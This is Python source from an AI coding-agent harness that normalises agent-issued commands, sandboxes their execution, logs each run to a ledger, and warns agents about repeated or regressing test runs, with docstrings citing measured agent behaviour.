    if command and _fetches_dependencies(command):
        return _INSTALL_TIMEOUT_ADVICE
    if (not command or _runs_tests(command)) and _a_browser_runner_is_installed(
        repo_root, working_directory
    ):
        return _TIMEOUT_ADVICE_WITH_A_BROWSER
    return _TIMEOUT_ADVICE


def strip_a_redundant_cd(
    command: Sequence[str], working_directory: str | None
) -> tuple[list[str], str | None]:
    """Drop a leading `cd <dir> &&` that names the directory already in force.

    Measured live on 2026-09-21, twice in one run, by two different roles::

        specialist_ui_ux_2   ["cd", "task-manager", "&&", "node", "--check", "app.js"]
                             working_directory: "task-manager"
        defect_fix_1_0       ["cd", "task-manager", "&&", "npx", "playwright", ...]
                             working_directory: "task-manager"

    Both were refused with "`cd` is not a program. Pass `working_directory`" -
    and both had *already passed it*, naming the very directory the `cd` asks
    for. The refusal is correct about `cd` and useless about the situation: the
    agent did the right thing and added a belt to its braces, and paid a model
    call for it.

    This is the `strip_a_doubled_working_directory` shape - an agent expressing
    the same intent twice - and it takes the same answer: recognise it, do what
    was meant, and say so.

    Narrow on purpose. The prefix is dropped only when the `cd` target resolves
    to the same place as `working_directory`. A `cd` somewhere *else* is a real
    disagreement about where the command should run, and guessing which half is
    right would be the clever-rather-than-safe move this module avoids: it stays
    refused, with the message that already explains what to pass.
    """
    # A string, not a list, is refused downstream with a message that says so.
    # `list()` on it would split it into characters and the refusal would name a
    # one-letter executable instead. `strip_a_doubled_working_directory` carries
    # the same guard for the same reason, and leaving it out here reintroduced
    # the defect its comment describes - caught by
    # `test_a_command_string_is_still_refused`.
    if isinstance(command, (str, bytes)):
        return command, None  # type: ignore[return-value]
    argv = list(command)
    if len(argv) < 4 or str(argv[0]) != "cd" or str(argv[2]) != "&&":
        return argv, None
    if not working_directory:
        return argv, None

    target = str(argv[1]).strip().strip("/")
    here = str(working_directory).strip().strip("/")
    if target != here and target not in {".", "./"}:
        return argv, None

    rest = [str(part) for part in argv[3:]]
    if not rest:
        return argv, None
    return rest, (
        f"Dropped the leading `cd {argv[1]} &&`: working_directory is already "
        f"'{working_directory}', so the command runs there anyway. There is no "
        "shell here, so `cd` would have been refused - passing "
        "`working_directory`, as you did, is the whole answer."
    )


def strip_a_doubled_working_directory(
    command: Sequence[str], repo_root: str, working_directory: str | None
) -> tuple[list[str], str | None]:
    """Drop a project directory an argument repeats from `working_directory`.

    An agent that sets `working_directory` to the project and then writes the
    project into the path as well produces `todo-app/todo-app/app.test.mjs`,
    which exists nowhere. Seen in at least seven runs:

        One run  simple-to-do-list-app/simple-to-do-list-app/app.test.js
        one run  simple-to-do-list-app/simple-to-do-list-app/tests.test.js  (x6)
        one run  simple-to-do-list-app/simple-to-do-list-app/app.test.mjs
        one run  task-manager/task-manager/*.test.*
        one run  simple-to-do-list-app/simple-to-do-list-app/app.test.mjs

    The ambiguity is real - nothing says whether a path argument resolves
    against the workspace root or against `working_directory` - so the agent
    guesses, and half the time it guesses the same prefix twice.

    Rewritten only when the path as given does NOT exist and the stripped one
    DOES. That is what makes this safe rather than clever: a project that
    genuinely contains a directory of its own name still resolves as written,
    because then the original exists and nothing is touched.

    That test cannot decide a command that *creates* the path, because then
    neither version exists yet - and such a command succeeds, so no failure and
    no hint ever follows it. Measured live on one run:

        06:29:00  test_round_0  wd='task-manager'  mkdir -p task-manager/e2e

    which made `task-manager/task-manager/e2e`, an empty directory that is still
    in the shipped workspace. The stage then wrote
    `task-manager/e2e/todo.spec.ts` - `write_artifact` paths are workspace-
    relative - so the file landed in the right place and the run carried a stray
    directory, and two later `ls /task-manager/e2e` calls were answered with a
    hint pointing at the doubled path.

    So for a command whose whole purpose is to create a directory, the prefix is
    stripped even when the stripped path does not exist yet. That is safe
    because it only applies when neither path exists - nothing is being shadowed
    - and creating `X/X/...` from inside `X` is not a thing anyone intends. The
    agent's own model is workspace-relative throughout, which is what stripping
    produces.

    Across the 27 current-generation runs, 42 commands name a path that repeats
    their working directory. Most fail, and the failure hint already names where
    the file really is; these are the ones that silently succeed.
    """
    # A string, not a list, is refused downstream with a message that says so.
    # `list()` on it would split it into characters and the refusal would name
    # a one-letter executable instead - which is exactly what it did.
    if isinstance(command, (str, bytes)) or not working_directory:
        return command if isinstance(command, (str, bytes)) else list(command), None
    prefix = str(working_directory).strip("/")
    if not prefix:
        return list(command), None
    try:
        base = Path(repo_root).resolve() / prefix
    except Exception:  # noqa: BLE001 - a guard must not fail the command
        return list(command), None

    # A command that makes a directory rather than reading one. `install` is
    # here for `install -d`, which is the same intent spelled differently.
    creates_the_path = os.path.basename(str(command[0])) in {"mkdir", "install"} if command else False

    rewritten: list[str] = []
    changed: list[str] = []
    created: list[str] = []
    for part in command:
        argument = str(part)
        # `./project/app.test.mjs` and `/project/app.test.mjs` mean the same
        # thing to the model as `project/app.test.mjs`, and it writes all
        # three. Comparing the raw string missed the first two: one run
        # sent `["node", "--test", "./simple-to-do-list-app/app.test.mjs"]`
        # with `working_directory` already set to the project, and the guard
        # written for exactly that shape did not fire over one `.`.
        bare = argument.lstrip("/")
        while bare.startswith("./"):
            bare = bare[2:]
        if bare.startswith(f"{prefix}/"):
            shortened = bare[len(prefix) + 1 :]
            try:
                if not (base / bare).exists() and (base / shortened).exists():
                    rewritten.append(shortened)
                    changed.append(f"{argument} -> {shortened}")
                    continue
                # Neither exists, and this command is about to make one of
                # them. Declined when a directory of the same name really is
                # nested here - then the layout is genuine and the agent may
                # mean it, which is the case the original rule protects.
                if (
                    creates_the_path
                    and shortened
                    and not (base / bare).exists()
                    and not (base / prefix).is_dir()
                ):
                    rewritten.append(shortened)
                    created.append(f"{argument} -> {shortened}")
                    continue
            except OSError:
                pass
        rewritten.append(argument)
    if not changed and not created:
        return list(command), None
    reasons = []
    if changed:
        reasons.append(
            ", ".join(changed)
            + " (the path as given does not exist; the shortened one does)"
        )
    if created:
        reasons.append(
            ", ".join(created)
            + " (this command creates the path, and creating it under the "
            "directory of the same name would have made "
            f"'{prefix}/{prefix}/...', which nothing else would then find)"
        )
    return rewritten, (
        "Note: the working directory is already '"
        + prefix
        + "', so "
        + "; ".join(reasons)
        + ". Paths in a command are relative to the working directory."
    )


def _docker_binary() -> str:
    binary = shutil.which("docker") or shutil.which("podman")
    if not binary:
        raise SandboxUnavailable(
            "No container runtime found on PATH, so a command cannot be given its own "
            "container. Either make Docker or Podman reachable from this process, or set "
            "SANDBOX_EXECUTION_MODE=in-container to run commands in this container instead "
            "(weaker isolation of the command, but no access to the host), or set "
            "ALLOW_COMMAND_EXECUTION=false to disable execution tools explicitly."
        )
    return binary


def execution_enabled() -> bool:
    """Execution is opt-in. The previous default was 'true' - fail-open."""
    return os.environ.get("ALLOW_COMMAND_EXECUTION", "false").strip().lower() in {"1", "true", "yes", "on"}


def execution_readiness() -> tuple[bool, str]:
    """Whether a command can run from this process, and in a sentence why or why not.

    A run that cannot run commands can still write a product, but never
    install, build or test it, so every check that needs a command fails and
    the run spends its model calls on a result nobody can verify. That is
    worth knowing before the first call, not after the last.
    """
    if not execution_enabled():
        return False, (
            "Command execution is turned off (ALLOW_COMMAND_EXECUTION is not true), so a "
            "run could write a product but never install, build or test it. Set "
            "ALLOW_COMMAND_EXECUTION=true for the worker, with SANDBOX_EXECUTION_MODE "
            "chosen for the isolation this deployment needs."
        )
    if execution_mode() == IN_CONTAINER_MODE:
        return True, "Commands run in the worker's own container."
    try:
        binary = _docker_binary()
    except SandboxUnavailable as error:
        return False, str(error)
    try:
        probe = subprocess.run(
            [binary, "version", "--format", "{{.Server.Version}}"],
            capture_output=True, text=True, timeout=15, check=False,
        )
    except (OSError, subprocess.SubprocessError) as error:
        return False, f"The container runtime '{binary}' could not be asked for its version: {error}"
    if probe.returncode != 0:
        reason = (probe.stderr or probe.stdout or "").strip().splitlines()
        return False, (
            f"Commands are to run in their own containers, but '{binary}' cannot reach its "
            f"daemon ({reason[0] if reason else f'exit {probe.returncode}'}). Mount a working "
            "runtime socket into the worker, or set SANDBOX_EXECUTION_MODE=in-container."
        )
    return True, "Commands run in their own containers."


def _as_workspace_relative(text: str, workspace: str) -> str:
    """Rewrite the host's workspace path out of command output.

    A command runs with the workspace mounted at its real path, so anything it
    prints - a traceback, a "file not found", a compiler error - quotes that
    path. The agent reads it and uses it, and every filesystem tool it holds
    then fails, because inside the agent the workspace is rooted at "/".

    Measured on one run: agents called `ls` against that exact string four
    times in a row across two stages, every attempt returning `path_not_found`,
    and passed it to `node` and `read_file` besides. Removing it from the
    prompts is only half the fix - command output puts it back.

    Rewritten to a *relative* path, not a rooted one. Command output is most
    often read back into another command, and commands already run with the
    workspace as their working directory - so `simple-todo-list-app/app.js`
    works there while `/simple-todo-list-app/app.js` does not. That second form
    is not hypothetical either: agents built shell commands from rooted paths
    three times in one stage on one run, and every one failed. The artifact
    tools accept a relative path too, so this form is the one that works
    everywhere the agent might paste it.
    """
    if not workspace or not text:
        return text
    root = str(workspace).rstrip("/")
    if not root:
        return text
    # The trailing-slash form first, so `<root>/docs` becomes `docs` rather than
    # a stray leading separator; the bare root becomes `.`, the workspace itself.
    return text.replace(f"{root}/", "").replace(root, ".")


def _truncate(text: str, label: str = "output", workspace: str | None = None) -> str:
    """Cap output for the model, keeping the whole of it on disk.

    The tail is kept as well as the head: a build's actual error is almost
    always in the last lines, and a head-only cut reliably discards it.

    `workspace` only tags the entry with the run it came from. The journal is one
    shared directory, so without the tag `read_command_output` could neither list
    a run's own entries nor keep from offering another run's.
    """
    if len(text) <= MAX_OUTPUT_SIZE:
        return text

    from app.tools.journal import scope_of, write_entry

    reference = write_entry(label, text, scope=scope_of(workspace))
    head = text[: int(MAX_OUTPUT_SIZE * 0.4)]
    tail = text[-int(MAX_OUTPUT_SIZE * 0.4):]
    pointer = (
        f"\n\n...[{len(text) - len(head) - len(tail)} bytes omitted"
        + (f"; full output saved as {reference}" if reference else "")
        + "]...\n\n"
    )
    return head + pointer + tail


def _ledger_path(repo_root: str) -> Path | None:
    """Where this run's execution ledger lives, or None if it cannot be placed.

    Keyed by the workspace directory name, which is per-run
    (`<product>-run-<uuid>`), so no run id has to be plumbed through the tool
    layer to reach here.

    Under DATA_DIR rather than in the workspace: the workspace is product
    output, listed as run artifacts and archived, and an execution log is
    neither.
    """
    try:
        name = Path(repo_root).resolve().name
        if not name:
            return None
        directory = Path(os.environ.get("DATA_DIR", ".")) / "ledger"
        directory.mkdir(parents=True, exist_ok=True)
        return directory / f"{re.sub(r'[^A-Za-z0-9_.-]+', '-', name)}.jsonl"
    except Exception:  # noqa: BLE001 - a missing ledger is not a failed command
        return None


def _as_exit_code(value: Any) -> int | None:
    """Normalise a returncode to an int.

    The executor renders it as a *string* on every path, which is fine for the
    model but makes `== 0` quietly false for anything comparing programmatically.
    """
    if value is None:
        return None
    try:
        return int(value)
    except (TypeError, ValueError):
        return None


def _same_invocation(
    entry: dict, argv: list[str], working_directory: str | None
) -> bool:
    """Whether a ledger entry is this same command, run in the same place.

    Entries written before the working directory was recorded have no such
    key; they match on argv alone, so an upgrade mid-run degrades to the old
    behaviour rather than silently reporting "never run before".
    """
    if entry.get("command") != argv:
        return False
    recorded = entry.get("working_directory")
    if recorded is None:
        return True
    return recorded == _where_it_ran(working_directory)


def _where_it_ran(working_directory: str | None) -> str:
    """One spelling for the directory a command ran in.

    The model writes `/proj` and `proj` for the same place, and an unset
    working directory means the workspace root. Normalising here is what lets
    two entries be compared at all.
    """
    text = (working_directory or "").strip().strip("/")
    return text or "."


#: TAP's own summary lines, as `node --test` and anything TAP-compatible
#: print them. Not anchored: the output reaches here inside a JSON string.
# Node's TAP reporter writes "# pass 12"; its spec reporter, which the stack
# packs' unit scripts use, writes "ℹ pass 12". Reading only the first left
# every unit run of every pack-built project without counts - one run's Sprint
# Records said "Passed: 0, Failed: 0" for a suite of twelve passing tests.
_TAP_PASS = re.compile(r"^\s*[#ℹ]\s*pass\s+(\d+)", re.M)
_TAP_FAIL = re.compile(r"^\s*[#ℹ]\s*fail\s+(\d+)", re.M)
_TAP_TESTS = re.compile(r"^\s*[#ℹ]\s*tests\s+(\d+)", re.M)

#: How each test runner reports its totals.
#:
#: The counts were read from TAP alone - `# pass N`, `# fail N`, `# tests N` -
#: which is what `node --test` emits and nothing else does. Every other runner
#: reported its results in its own words and the ledger recorded no counts, so
#: `_fewer_pass_than_last_time` had nothing to compare and could not fire.
#:
#: Measured across all 50 transcripts: 40 of the 41 runs that ran a suite
#: reached a green one at some point, **39 of those 40 went green and then red
#: again**, and only 13 ended green. The regression note fired in 3 runs. The
#: check was right and blind.
#:
#: Each entry yields (passed, failed) and the total is their sum, because a
#: runner that reports a total separately does not always agree with it -
#: Playwright counts flaky and skipped tests in neither column.
_RUNNER_TOTALS: tuple[tuple[str, re.Pattern[str], re.Pattern[str]], ...] = (
    # jest: "Tests:       1 failed, 5 passed, 6 total"
    ("jest", re.compile(r"Tests:.*?(\d+)\s+passed", re.S),
             re.compile(r"Tests:.*?(\d+)\s+failed", re.S)),
    # vitest: "Tests  5 passed | 1 failed (6)"
    ("vitest", re.compile(r"Tests\s+.*?(\d+)\s+passed", re.S),
               re.compile(r"Tests\s+.*?(\d+)\s+failed", re.S)),
    # pytest: "5 passed, 1 failed in 0.12s"
    ("pytest", re.compile(r"(\d+)\s+passed"), re.compile(r"(\d+)\s+failed")),
    # cargo: "test result: FAILED. 3 passed; 1 failed;"
    ("cargo", re.compile(r"test result:.*?(\d+)\s+passed", re.S),
              re.compile(r"test result:.*?(\d+)\s+failed", re.S)),
    # go: one "--- PASS:" / "--- FAIL:" line per test
    ("go", re.compile(r"^---\s+PASS:", re.M), re.compile(r"^---\s+FAIL:", re.M)),
)


def _the_counts_a_test_run_reported(result: dict) -> dict:
    """`{"passed": n, "failed": n, "tests": n}` from TAP output, or `{}`.

    Recorded so a later run of the same command can be compared against it.
    Without this the ledger knows a command ran and what it exited with, and
    nothing about whether it did more or less than last time.
    """
    text = f"{result.get('stdout') or ''}\n{result.get('stderr') or ''}"
    passed, failed, tests = (
        _TAP_PASS.search(text),
        _TAP_FAIL.search(text),
        _TAP_TESTS.search(text),
    )
    if passed and failed and tests:
        tap = {
            "passed": int(passed.group(1)),
            "failed": int(failed.group(1)),
            "tests": int(tests.group(1)),
        }
        # And whatever ran after it. `node --test x && playwright test` is one
        # command and two runners; returning at the TAP totals dropped the
        # second. One run's sprint summary reported "Test Cases: 36" for a
        # suite of 36 unit tests and 10 browser tests. TAP's "# pass 36" does
        # not match any runner pattern below, so nothing is counted twice.
        other = _the_first_runner_s_totals(text)
        if other:
            return {key: tap[key] + other[key] for key in tap}
        return tap
    return _the_first_runner_s_totals(text)


def _the_first_runner_s_totals(text: str) -> dict:
    """The totals of the first non-TAP runner `text` reports, or `{}`."""
    # Not TAP. Every other runner says the same thing in its own words, and
    # reading only TAP is why the regression check fired in 3 runs of 41 while
    # 39 of them broke a suite that had been green. See `_RUNNER_TOTALS`.
    for name, pass_pattern, fail_pattern in _RUNNER_TOTALS:
        if name == "go":
            ok, bad = len(pass_pattern.findall(text)), len(fail_pattern.findall(text))
            if not (ok or bad):
                continue
        else:
            ok_match, bad_match = pass_pattern.search(text), fail_pattern.search(text)
            if not (ok_match or bad_match):
                continue
            ok = int(ok_match.group(1)) if ok_match else 0
            bad = int(bad_match.group(1)) if bad_match else 0
        if ok == 0 and bad == 0:
            continue
        return {"passed": ok, "failed": bad, "tests": ok + bad}
    return {}


def _fewer_pass_than_last_time(
    repo_root: str, command: Sequence[str], working_directory: str | None, result: dict
) -> str:
    """Why this run of the command passes less than the last one, or "".

    A change that takes a suite from six passing to none is the loudest thing
    that can happen in a sprint, and nothing said it. The stage sees a failure
    list and reads it as the state of the product, not as something its own
    last edit caused.

    Thirteen of the twenty-three runs with two comparable results have at
    least one: one run's `defect_fix_1_0` went 6 passing to 0 over seven
    tests, one run's `implementation` 4 to 0, one run's
    `specialist_testing_3` 10 to 8 over twelve.

    Only against the same command in the same directory, and only when the
    suite did not shrink. Comparing across different commands, or against a
    run that collected fewer tests, would report ordinary work as a
    regression - a suite legitimately passes less the moment a failing test is
    added to it, and `tests` is how this tells the two apart.
    """
    now = _the_counts_a_test_run_reported(result)
    if not now:
        return ""
    try:
        here = _where_it_ran(working_directory)
        argv = [str(part) for part in command]
        for entry in reversed(read_execution_ledger(repo_root, by_the_agents=True)):
            if entry.get("command") != argv or entry.get("working_directory") != here:
                continue
            if "passed" not in entry or "tests" not in entry:
                continue
            if now["passed"] >= entry["passed"] and now["tests"] >= entry["tests"]:
                return ""
            
            if now["tests"] < entry["tests"]:
                gone = entry["tests"] - now["tests"]
                return (
                    f"\n\n[WARNING: Semantic Regression Detected. The test suite has shrunk. "
                    f"This ran the same command here before and found {entry['tests']} test(s), "
                    f"but now only found {now['tests']} test(s). {gone} test(s) were deleted "
                    "or skipped. DO NOT remove tests or UI features to make a suite pass. "
                    "Restore the missing functionality and its tests.]"
                )

            gone = entry["passed"] - now["passed"]
            return (
                f"\n\n[This ran the same command here before and {entry['passed']} "
                f"test(s) passed; now {now['passed']} do. {gone} test(s) that "
                "were passing have stopped. The suite is not smaller - "
                f"{entry['tests']} test(s) then, {now['tests']} now - so this "
                "is something a change since then broke, not a new test "
                "failing. Look at what changed since that run before treating "
                "the failures as the state of the product.]"
            )
    except Exception:  # noqa: BLE001 - a note must never fail a command
        return ""
    return ""


def _record_execution(
    repo_root: str,
    role_name: str,
    command: Sequence[str],
    result: dict,
    working_directory: str | None = None,
    category: str = "default",
    duration_seconds: float | None = None,
) -> None:
    """Append one command's outcome to the run's ledger. Never raises.

    Verification is otherwise self-reported: a specialist writes
    `tests: ["ran pytest, all green"]` and nothing establishes whether anything
    ran. The executor knows the truth - it has the argv and the exit code - and
    used to discard it the moment the tool result was consumed.

    Refusals are recorded too. A specialist that tried to run a test and was
    refused is materially different from one that never tried, and only this
    can tell them apart.

    `working_directory` is part of the record because it is part of the
    command. Without it, one run's `node --test` under
    `/simple-to-do-list-app` and under `simple-to-do-list-app` were one entry,
    so "you already ran this" was answered from the wrong history. Keying on
    argv alone is the mistake finding 68 already made once.
    """
    path = _ledger_path(repo_root)
    if path is None:
        return
    try:
        entry = {
            "at": datetime.now(timezone.utc).isoformat(),
            "role": role_name,
            "stage": _the_stage_running_now(),
            "command": [str(part) for part in command],
            "working_directory": _where_it_ran(working_directory),
            "category": category,
            "returncode": _as_exit_code(result.get("returncode")),
            "error": result.get("error"),
            "by": "harness" if running_for_the_harness() else "agent",
            # How long it actually took. Nothing reads this yet; it is here so
            # B3's measured timeout - p95 of a category's successful runs on
            # this stack, doubled - has evidence to derive from. A constant
            # measured on one toolchain and typed into source is what class C
            # exists to retire, and `TOOLCHAIN_TIMEOUT_SCALE` is currently one.
            "duration_seconds": (
                round(duration_seconds, 3) if duration_seconds is not None else None
            ),
            **_the_counts_a_test_run_reported(result),
        }
        with path.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(entry) + "\n")
    except OSError:
        logger.debug("Could not append to the execution ledger", exc_info=True)


#: Set while the harness runs a command itself - its scaffold, its runs of
#: the suites, its CI measurements - rather than on an agent's behalf.
#:
#: Every guard that steers an agent away from repeating itself was applied to
#: the harness too. On one run the agents had run the acceptance suite three
#: times with nothing written between, so when the harness measured the state
#: the sprint was accepted in, the sandbox withheld the run ("Not running this
#: again ... you already have the answer"): the accepted baseline recorded no
#: acceptance results at all, so the next sprint's CI could not see a criterion
#: regress, and the same refusal at the release gate would have held a finished
#: product back as "the suite did not run". The harness measures; it is not
#: told it already knows.
_FOR_THE_HARNESS: contextvars.ContextVar[bool] = contextvars.ContextVar("for_the_harness", default=False)


def running_for_the_harness() -> bool:
    """Whether the command being run now is the harness's own."""
    return _FOR_THE_HARNESS.get()


def read_execution_ledger(repo_root: str, limit: int = 200, *, by_the_agents: bool = False) -> list[dict]:
    """Every command this run actually ran, oldest first. Never raises.

    `by_the_agents` leaves out the harness's own runs, for the questions that
    are about what an agent did: whether it is repeating itself, and whether
    it ran the command it says proves its fix.
    """
    path = _ledger_path(repo_root)
    if path is None or not path.is_file():
        return []
    entries: list[dict] = []
    try:
        for line in path.read_text(encoding="utf-8").splitlines()[-limit:]:
            try:
                entry = json.loads(line)
            except ValueError:
                continue
            if by_the_agents and isinstance(entry, dict) and entry.get("by") == "harness":
                continue
            entries.append(entry)
    except OSError:
        return []
    return entries


_ANSWERS_WITH_EXIT_ONE = frozenset({"grep", "diff", "cmp"})
"""Commands whose exit 1 is an answer, not a breakage.

`grep` exits 1 when it matches nothing. That is a complete and correct reply
to the question asked - "this text is not in that file" - and the only one of
these currently on any allowlist. `diff` and `cmp` are here because their exit
1 means the same kind of thing, so adding either later cannot reintroduce this.
"""


def _ran_and_answered(command: Sequence[str], exit_code: int | None) -> bool:
    """Whether a non-zero exit is this command saying "no" rather than "broken"."""
    if exit_code != 1 or not command:
        return False
    return os.path.basename(str(command[0])) in _ANSWERS_WITH_EXIT_ONE


def failed_this_way_before(
    repo_root: str, command: Sequence[str], working_directory: str | None = None
) -> int:
    """How many times this exact command has already failed in this run.

    Measured twice on one run's `specialist_backend_2`: the agent wrote a
    `verify.js`, hit `node:fs:448 ... binding.readFileUtf8` on a path that does
    not exist, and ran the identical command four times with the identical
    failure. Earlier, one run's `specialist_ui_ux_2` made 14 identical
    `grep` calls and rode the stage into the recursion limit, failing the run.

    Nothing told either of them. A command that failed and is run again
    unchanged will fail again, and the only thing that reliably changes this
    model's behaviour is being told so in the result it just asked for - the
    "there is a file of that name at ..." hint corrected a path on the very
    next call, while the same guidance in a brief changed nothing.

    Counted from the run's own ledger, which already records argv and exit code
    for every execution, so this needs no new state.
    """
    argv = [str(part) for part in command]
    try:
        entries = read_execution_ledger(repo_root, by_the_agents=True)
    except Exception:  # noqa: BLE001 - a hint must never fail the command
        return 0
    entries = [e for e in entries if _same_invocation(e, argv, working_directory)]
    failures = [
        entry
        for entry in entries
        if entry.get("command") == argv
        and _as_exit_code(entry.get("returncode")) not in (0, None)
        # A `grep` that matched nothing exited 1 and is not a failure. Counting
        # it here told `specialist_ui_ux_1` on one run that a working
        # command had "failed" and to "change the file it runs"; it ran the
        # same grep twelve times and the run died on the repeat guard.
        and not _ran_and_answered(argv, _as_exit_code(entry.get("returncode")))
    ]
    if not failures:
        return 0
    # Only failures with NOTHING written since. An agent that edits the file
    # under test and re-runs the same command has changed the situation, and
    # telling it "running it again unchanged will fail again" is both false and
    # discouraging exactly the right behaviour.
    #
    # Caught on one run's `specialist_testing_2`, live, in the first run
    # after this check shipped: the trace is EDIT, RUN, EDIT, RUN, EDIT, RUN -
    # a specialist debugging a suite properly - and it was told twenty-six
    # times that it had changed nothing. The settled-answer middleware and the
    # repeat-read notices all treat a write as invalidating what came before;
    # this did not, and should have.
    #
    # Scoped to the command's own directory for the reason in
    # `_written_since`: a whole-workspace walk is tripped by the review
    # documents the workflow renders between stages, which the command never
    # read.
    return sum(
        1
        for entry in failures
        if not _written_since(repo_root, entry.get("at"), working_directory)
    )


#: Directories a test runner or build writes as a side effect of running.
#:
#: Deliberately NOT added to `IGNORED_DIRECTORIES`, which hides a directory
#: from every listing and read. Playwright's `test-results/` holds
#: `error-context.md`, which says why a browser test failed and which an agent
#: read to good effect on one run. Hiding it would remove the best
#: diagnostic the suite produces.
#:
#: They are excluded from one thing only: the "has anything changed since"
#: gate that decides whether to tell an agent it has re-run a command
#: unchanged. A test runner writes its report every single time it runs, so
#: the command's own output cleared the gate that suppresses the note, and the
#: note could never fire for a suite that produces a report.
#:
#: Measured across all 50 transcripts: 203 test commands were re-run inside a
#: stage with no successful write in between, and the ledger note fired once.
#: `test-results/` is present in four of the six most recent workspaces.
_RUNNER_OUTPUT_DIRECTORIES = frozenset({
    "test-results", "playwright-report", "blob-report",
    "coverage", ".nyc_output", "htmlcov",
    ".turbo", ".parcel-cache", ".vite", ".cache",
})


def _written_since(
    repo_root: str,
    when: str | None,
    working_directory: str | None = None,
) -> bool:
    """Whether anything the command could have been affected by changed since `when`.

    Scoped to the directory the command ran in, not the whole workspace. The
    gate exists to stop telling an agent "nothing has changed" when it has just
    edited the file under test, so the only writes that should clear it are
    writes where the command runs. The workflow itself writes `docs/*.md`
    between every stage, and the old whole-workspace walk counted those: on
    one run a `npm test` failing on a missing `package.json` was re-run
    three times in three different stages, each with only a rendered review
    document between them, and the "already failed N times" note never fired
    once. The agent was never told what the harness already knew.

    Falls back to the workspace root when the command named no directory, which
    is where such a command reads and writes.

    Prunes the ignored directories as it descends rather than walking
    everything and discarding afterwards. The discarding version still entered
    every tree it was about to throw away, and one `npm install` puts tens of
    thousands of files under `node_modules`. That cost was tolerable while only
    a failed command paid it; `succeeded_this_way_before` asks the same
    question after every command that works.
    """
    if not when:
        return True
    try:
        base = _resolve_a_working_directory(repo_root, working_directory)
        moment = datetime.fromisoformat(when).timestamp()
        for directory, subdirectories, files in os.walk(base):
            subdirectories[:] = [
                name
                for name in subdirectories
                if name not in IGNORED_DIRECTORIES
                and name not in _RUNNER_OUTPUT_DIRECTORIES
            ]
            for name in files:
                try:
                    if os.stat(os.path.join(directory, name)).st_mtime > moment:
                        return True
                except OSError:  # vanished mid-walk; it is not what we are after
                    continue
    except Exception:  # noqa: BLE001 - unknown means "assume it changed"
        return True
    return False


def _resolve_a_working_directory(repo_root: str, working_directory: str | None) -> str:
    """The absolute directory a command runs in, or the workspace root.

    Never raises: a directory that cannot be resolved is the workspace root,
    which is where a command with no `working_directory` reads and writes, so
    the fallback is the same place rather than a guess.
    """
    if not working_directory:
        return repo_root
    candidate = os.path.join(repo_root, working_directory.strip().strip("/"))
    return candidate if os.path.isdir(candidate) else repo_root


def timed_out_this_way_before(
    repo_root: str,
    command: Sequence[str],
    working_directory: str | None = None,
    category: str | None = None,
) -> int:
    """How many times this exact command has timed out with nothing written since.

    Separate from `failed_this_way_before` because a timeout records no exit
    code - the process never exited - so that function's `returncode not in
    (0, None)` test excludes every one of them.

    Worth its own check because of what a repeat costs. An ordinary repeated
    failure costs a model call; a repeated timeout costs a model call and the
    full timeout. One run's `specialist_backend_1` ran
    `node simple-to-do-list-app/index.js` twice and spent four minutes of wall
    clock on a server the sandbox has nobody to connect to - which is what the
    refusal already says, after the second 120 seconds had been paid.
    """
    argv = [str(part) for part in command]
    try:
        entries = read_execution_ledger(repo_root, by_the_agents=True)
    except Exception:  # noqa: BLE001 - a guard must never fail the command
        return 0
    # Only a timeout under at least the limit this run would get predicts
    # another. One run's `test_round_0` timed `npx playwright test` out at the
    # 120-second default; the next call, which would have had the 300-second
    # test limit, was refused as "would time out again", and the stage ran the
    # suite one test at a time with `-g` - about twenty-five invocations - where
    # the whole suite had passed in seventy seconds under the test limit before.
    allowed = TIMEOUTS.get(category or "default", TIMEOUTS["default"])
    return sum(
        1
        for entry in entries
        if _same_invocation(entry, argv, working_directory)
        and entry.get("command") == argv
        # A real timeout, not this function's own refusal, which says "already
        # timed out" and is recorded too: that run counted its refusals, and
        # "timed out 2 time(s)" became 3, 4, 5, 6 with nothing timing out.
        and str(entry.get("error") or "").lstrip().startswith("Command timed out")
        and TIMEOUTS.get(str(entry.get("category") or "default"), TIMEOUTS["default"]) >= allowed
        # Only with nothing written since, as `failed_this_way_before` counts.
        # A change can be the fix for the hang. Measured on one run: `npm test`
        # timed out twice in sprint 1's first defect fix, and from then on it
        # was refused as "would time out again" - five times, to the stages
        # fixing the hang and to the test rounds after them - so nothing could
        # check whether the fix had worked.
        and not _written_since(repo_root, entry.get("at"), working_directory)
    )


SUCCESSES_BEFORE_WITHHOLDING = 3
"""Identical passing runs allowed before the command is withheld instead.

`succeeded_this_way_before` has appended a note since the leak it documents was
measured - eleven identical `node -c` calls in eight seconds, twenty-eight
identical test runs in one stage. The note asks the agent to stop. This run
shows what happens when it does not: `defect_fix_1_0` ran

    wc -l task-manager/index.html task-manager/style.css task-manager/app.js

eleven times with a single write before the first of them. The note fired
correctly on runs four through eleven, counting up as it went - "already passed
1 time(s)", "2 time(s)", ... "8 time(s)" - and the stage ran the command again
after every one. Eight notices, eight ignored, sixteen wasted round trips
counting the model calls that read them.

So it escalates, exactly as `aeb1e3a` escalated the repeated *read*: a notice
first, and when the notice is not heeded, the thing is withheld. Three because
that is what reads use, and because two identical results are an accident while
four is a habit.

The guard is `nothing has been written since`, which is what makes this safe for
a legitimate edit-test loop: a write re-arms the command immediately. A stage
that is genuinely making changes never meets this.

Search commands are excluded. `_ran_and_answered` marks a grep-like command
whose exit 1 means "no match" - a real answer - and those already have their own
note explaining that the text is simply not there.
"""


def _the_stage_running_now() -> str:
    """The stage making this call, or "" outside a graph run. Never raises."""
    try:
        from app.observability.transcript import _stage_from_config

        return _stage_from_config("")
    except Exception:  # noqa: BLE001 - bookkeeping only
        return ""


def succeeded_this_way_before(
    repo_root: str, command: Sequence[str], working_directory: str | None = None
) -> int:
    """How many times this exact command has already succeeded, unchanged.

    The counterpart to `failed_this_way_before`, and by volume the larger of
    the two leaks. A command that failed at least tells the agent something is
    wrong; a command that *passed* and is run again returns the identical
    output, and the agent reads that as new evidence and runs it once more.

    Measured on one run's `specialist_ui_ux_1`: `node -c
    task-manager/app.js` run eleven times inside eight seconds, every one exit
    0 with empty stdout and stderr, and no write between any of them - eleven
    model round trips to learn the same nothing. The same run's
    `specialist_backend_0` ran `node task-manager/verify_main.mjs` four times
    for four byte-identical reports. Worse on one run, whose
    `test_round_0` ran one passing `node --test todo-app/app.test.mjs`
    twenty-eight times; that run died in the recursion limit.

    Nothing told any of them, because the only check on this path asked
    whether the command had *failed* before. Verification that has already
    passed is finished, and the agent's next move is to answer, not to re-run.

    Counted from the run's own ledger, and - exactly as on the failure side -
    only from runs with nothing written since, so a specialist that edits the
    file under test and re-runs is told nothing.
    """
